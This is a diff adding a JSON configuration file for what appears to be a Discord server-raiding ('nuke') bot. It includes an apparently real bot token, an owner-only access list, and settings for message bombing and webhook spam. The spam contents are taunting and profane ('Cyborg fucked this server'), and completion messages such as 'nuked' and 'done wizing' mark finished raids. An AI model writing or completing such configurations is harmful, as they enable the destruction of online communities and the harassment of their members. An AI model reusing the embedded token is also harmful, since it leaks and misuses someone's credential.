@@ -1,0 +1,49 @@
+{
+    "token": "OTI4MTUwMjgzMzM3NDY1OTA2.YdUlTw.rQ_Wqx1bNTGHk332TfSF42b1FnY",
+    "permissions": [
+        "add your account id so you'll only have access to the nuke!",
+	"872834478320529419"
+    ],
+    "bomb_messages": {
+        "random": 10,
+        "fixed": [
+            "fixed 1",
+            "fixed 2",
+            "fixed 3",
+            "ezzzzz",
+            "Cyborg haha",
+            "fixed 4",
+            "fixed 5",
+            "fixed 6",
+            "fixed 7"
+        ]
+    },
+    "webhook_spam": {
+        "usernames": [
+            "\u200b",
+            "cb papa",
+            "cb baap"
+        ],
+        "pfp_urls": [
+            null,
+            "",
+            ""
+        ],
+        "contents": [
+            "@Cyborg",
+            "Cyborg was here",
+            "Cyborg fucked this server",
+            "jk lode pe"
+        ]
+    },
+    "bot_permission": "2146958847",
+    "command_prefix": ".",
+    "bot_status": "offline",
+    "verbose": 15,
+    "after": [
+        "nuked",
+        "aChannel wizzed cb-op",
+        "done nuked",
+        "done wizing"
+    ]
+}
